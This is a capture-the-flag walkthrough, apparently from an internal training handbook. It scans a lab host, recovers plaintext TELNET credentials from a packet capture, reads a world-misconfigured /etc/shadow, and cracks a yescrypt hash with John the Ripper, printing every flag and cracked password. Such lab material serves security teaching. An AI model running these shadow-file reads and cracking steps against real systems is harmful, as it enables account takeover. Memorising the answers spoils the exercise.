# CTF: Remote Shells Basics

__MASTER HANDBOOK 2026.02__

DESCRIPTION: Network administrators typically use remote shell protocols to access and manage servers on the network. TELNET is a legacy remote-access protocol that transmits all data, including credentials, in plaintext. Although largely replaced by SSH (secure shell), TELNET services may still exist in misconfigured or legacy environments.

In this challenge, you will analyze captured network traffic, recover a username and password, access a TELNET service, and escalate by cracking password hashes.

DIFFICULTY: Novice

ESTIMATED TIME: 20 minutes

TARGET: remoteshell.corp.net (172.31.27.203)

OBJECTIVES:
+ Analyze network traffic to extract plaintext credentials
+ Access a TELNET server and enumerate for files of interest
+ Identify password hashes stored on the system
+ Crack a modern Linux password hash using John the Ripper

## PART 0x00 -- Identify Listening Ports

Use Nmap to discover any listening services.

_Questions:_
+ What TCP ports are open on the target?
+ What services typically use those ports?

_Command(s):_

```
$ nmap --open -F remoteshell.corp.net
```

_Expected Output:_

```
Nmap scan report for remoteshell.corp.net (172.31.27.203)
PORT   STATE SERVICE
22/tcp open  ssh
23/tcp open  telnet
```

## PART 0x01 -- Packet Capture Analysis

Download the provided [[\\CYBERNAS\Internal\Documentation\Cyber_Range\CTF03_REMOTE_SHELL\CTF03_REMOTE_SHELL_PCAP.pcapng|PCAP file]] and determine how a user authenticated to the TELNET server.

Filter for TELNET traffic and follow the TCP stream to inspect the session contents.

_Question(s):_
+ What username was used?
+ What password was transmitted?

_Username:_

{{:telnet_user_filtering_line.png|}}

_Password:_

{{:telnet_pass_filtering_line.png|}}

_Flag\_01 (user:pass):_

```
telnetuser:FLAG{planetxtb@d}
```

## PART 0x02 -- Initial Access

Using the credentials recovered from the packet capture, access the TELNET server. Explore the user's home directory to locate files of interest.

_Command(s):_

```
$ telnet --user telnetuser remoteshell.corp.net
Trying 172.31.27.203 ...
Connected to remoteshell.corp.net.
Password:
[telnetuser@remoteshell ~]$ cat ~/telnet/flags/flag2.txt
```

_Flag\_02:_

```
FLAG{we_h8_telnet}
```

## PART 0x03 -- Credential Harvesting

Investigate whether password hashes are exposed on the system.

Locate the password hash associated with the SSH user account and determine:
+ The full hash value
+ The hashing algorithm in use (hashes.com/en/tools/hash_identifier)

_Command(s):_

```
[telnetuser@remoteshell ~]$ grep "ssh" /etc/passwd
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/usr/sbin/lologin
sshuser:x:1000:1000:sshUser:/home/sshuser:/bin/bash
```

```
[telnetuser@remoteshell ~]$ ls -l /etc/shadow
----r-----. 1 root telnetuser 798 Jan 21 13:16 /etc/shadow
```

Notice how ''/etc/shadow'' has a misconfiguration that gives ''telnetuser'' read access.

```
[telnetuser@remoteshell ~]$ grep "sshuser" /etc/shadow | cut --delimiter=: --fields=1,2
sshuser:$y$j9T$pwlVVTOrFML5ehUUobZhV.$UIYwFkjcVwioyReJTh24EpKgV6hoEKWkIRCoAswb80C
```

_Username:_

```
sshuser
```

_Password Hash:_

```
$y$j9T$pwlVVTOrFML5ehUUobZhV.$UIYwFkjcVwioyReJTh24EpKgV6hoEKWkIRCoAswb80C
```

_Hash Type:_

```
yescrypt ($y$)
```

## PART 0x04 -- Password Cracking

Using John the Ripper, attempt to crack the hash discovered in the previous step.

You may need to specify the correct hash format. Use the preinstalled __ROCKYOU__ wordlist to perform the attack.

_Commands (John the Ripper):_

```
$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
$ john -format:crypt -wordlist:/usr/share/wordlists/rockyou.txt ./hash.txt
$ john -show ./hash.txt
```

_Flag\_03:_

```
sshuser:meowmix
```

## PART 0x05 -- Secure Shell

Using the credentials recovered from the JTR, access the SSH server. Explore the user's home directory to locate files of interest.

_Command:_

```
$ ssh sshuser@remoteshell.corp.net cat /home/sshuser/Desktop/flag4.txt
```

_Flag\_04:_

```
FLAG{Y7qbAXGo}
```

----

EOF
